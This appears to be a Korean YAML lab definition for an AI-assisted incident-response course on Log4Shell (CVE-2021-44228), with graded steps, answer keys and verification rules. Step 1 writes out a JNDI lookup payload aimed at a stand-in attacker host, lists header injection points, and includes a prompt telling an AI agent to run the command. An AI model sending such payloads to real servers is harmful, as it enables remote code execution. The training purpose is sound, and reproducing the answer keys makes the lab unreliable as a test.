lab_id: agent-ir-adv-ai-week06
title: N-day 대규모 악용 (Log4Shell 계열) IR (AI 지원)
version: ai
course: agent-ir-adv-ai
week: 6
description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. AI SubAgent
  자동 실행·검증.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Log4Shell 페이로드 예시
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: '🤖 프롬프트: Log4Shell 페이로드 예시

    📎 참고 (CLI): echo ''${jndi:ldap://attacker/a}'' > /tmp/w06-log4shell.txt && cat
    /tmp/w06-log4shell.txt'
  answer_detail: '[공격] 기본 페이로드.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: Log4Shell 페이로드 — ${jndi:ldap://attacker.com/a} 또는 ${jndi:dns://...}.
        CVE-2021-44228 Log4j JNDI lookup 악용. User-Agent·X-Forwarded-For·URI 파라미터 등
        다양한 주입점
      success_criteria:
      - ${jndi:...} 페이로드
      - CVE-2021-44228
      acceptable_methods:
      - curl -H + 페이로드
      negative_signs:
      - jndi 없음
  target_vm: web
  script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
  risk_level: low
  bastion_prompt: 'Log4Shell 페이로드 예시


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 변형 페이로드 5종
